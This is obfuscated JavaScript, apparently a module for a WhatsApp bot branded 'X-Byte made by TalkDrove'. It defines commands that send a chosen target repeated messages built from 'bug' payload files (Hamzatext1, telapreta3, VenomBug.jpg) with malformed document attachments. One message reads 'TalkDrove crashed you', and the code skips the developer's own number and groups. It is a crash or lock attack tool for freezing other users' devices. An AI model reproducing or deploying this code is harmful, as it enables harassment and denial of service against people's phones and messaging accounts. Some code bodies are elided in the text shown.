(function (_0x4820ea, _0x4e5693) {
  ...
  const {
    Hamzatext1
  } = require("../lib/bugs/Hamzatext1");
  const {
    Hamzatext6
  } = require("../lib/bugs/Hamzatext6");
  const {
    telapreta3
  } = require("../lib/bugs/telapreta3");
  const {
    Hamzatext7
  } = require("../lib/bugs/Hamzatext7");
  const travaft = fs.readFileSync("./lib/bugs/VenomBug.jpg");
  const _0x5f5528 = {
    fromMe: false,
  ...
  const _0x27e050 = {
    title: "X-Byte made by TalkDrove"
  };
  const _0x3064ad = {
  ...
  cmd(_0x428889, async (_0x3539b5, _0x4978dd, _0x3136b5, {
    ...
    try {
      ...
      for (let _0x50ad14 = 50; _0x50ad14 !== 0; _0x50ad14 -= 1) {
        setTimeout(async () => {
          const _0x1fd63d = {
            title: "TalkDrove crashed you ",
            body: "🤣🤬🤣🤬🤣🤬🤣🤬",
            thumbnail: travaft,
            sourceUrl: "https://youtube.com/@TalkDrove"
          };
          const _0x175eca = {
      ...
      _0x3dd00e("an error occurred while executing the command contact the Hamza developer!");
      _0x5915b8(_0x19111e);
    }
  });
  const _0x164ac7 = {
  ...
  cmd(_0x164ac7, async (_0x38fbeb, _0x5ab3c7, _0x42cd2b, {
    ...
    try {
      ...
      _0x57893b("an error occurred while executing the command contact the Hamza developer!");
      _0x1f9bc0(_0x37f8fa);
    }
  });
  const _0x3a4856 = {};
  ...
  cmd(_0x3a4856, async (_0x403633, _0x10d952, _0x1e0868, {
    ...
    try {
      ...
      if (_0x39f4bf.includes("923072380380") || _0x39f4bf.includes("923072380380") || _0x39f4bf.includes("923072380380")) {
        return _0x11ee48("Sorry, I cant upload code to my Hamza developer 🥱\nTry to use it on another private!!");
      }
      if (_0x39f4bf.includes("120363026309634278@g.us") || _0x39f4bf.includes("120363028400218278@g.us")) {
        return _0x11ee48("Sorry, I cant send locks to my Hamza developers group 🥱\nTry using it in another group!!");
      }
      const _0x3b3155 = {
        fromMe: false,
        participant: "0@s.whatsapp.net",
      ...
      _0x11ee48("an error occurred while executing the command contact the Hamza developer!");
      _0x1dfe3f(_0x30f8ed);
    }
  });
  const _0x29193c = {
  ...
  cmd(_0x29193c, async (_0x4e3848, _0x21f0a5, _0x48b35e, {
    ...
    try {
      ...
      if (_0xad8c89.includes("923072380380") || _0xad8c89.includes("923072380380") || _0xad8c89.includes("923072380380")) {
        return _0x33f3b4("Sorry, I cant upload code to my Hamza developer 🥱\nTry to use it on another private!!");
      }
      if (_0xad8c89.includes("120363026309634278@g.us") || _0xad8c89.includes("120363028400218278@g.us")) {
        return _0x33f3b4("Sorry, I cant send locks to my Hamza developers group 🥱\nTry using it in another group!!");
      }
      ...
      _0x33f3b4("an error occurred while executing the command contact the Hamza developer!");
      _0x3c690c(_0x11bdca);
    }
  });
  const _0x165883 = {
  ...
  cmd(_0x165883, async (_0x416f31, _0x49db1d, _0xd39758, {
    ...
    try {
      ...
      if (_0xb375b0.includes("923072380380") || _0xb375b0.includes("923072380380") || _0xb375b0.includes("923072380380")) {
        return _0x5549f1("Sorry, I cant upload code to my Hamza developer 🥱\nTry to use it on another private!!");
      }
      if (_0xb375b0.includes("120363026309634278@g.us") || _0xb375b0.includes("120363028400218278@g.us")) {
        return _0x5549f1("Sorry, I cant send locks to my Hamza developers group 🥱\nTry using it in another group!!");
      }
      const _0x47ddbd = {
        text: '⏳️',
        key: _0x49db1d.key
  ...
  cmd(_0x55f3f0, async (_0x324c94, _0x41ae65, _0x22217a, {
    ...
    try {
      ...
      if (_0x58ebf1.includes("923072380380") || _0x58ebf1.includes("923072380380") || _0x58ebf1.includes("923072380380")) {
        return _0x33fb90("Sorry, I cant upload code to my Hamza developer 🥱\nTry to use it on another private!!");
      }
      if (_0x58ebf1.includes("120363026309634278@g.us") || _0x58ebf1.includes("120363028400218278@g.us")) {
        return _0x33fb90("Sorry, I cant send locks to my Hamza developers group 🥱\nTry using it in another group!!");
      }
      ...
      for (let _0x37fc2b = 0; _0x37fc2b < amount; _0x37fc2b++) {
        async function _0x129ccb(_0x731f4b, _0x18263a) {
          ...
          _0x1cff2b.sendMessage(_0x18263a, {
            'document': _0x1a741b,
            'mimetype': "image/null",
            'fileName': _0x731f4b + '.' + Hamzatext1,
            'caption': '' + (_0x731f4b + Hamzatext1)
          }, _0x21becb);
        }
      ...
      for (let _0x57ad7f = 0; _0x57ad7f < amount; _0x57ad7f++) {
        async function _0x5a0bf1(_0xde27dc, _0x492b13) {
          ...
          _0x5b2922.sendMessage(_0x492b13, {
            'document': _0x3c4228,
            'mimetype': "image/null",
            'fileName': _0xde27dc + '.' + Hamzatext1,
            'caption': '' + (_0xde27dc + Hamzatext1)
          }, _0x36187d);
        }
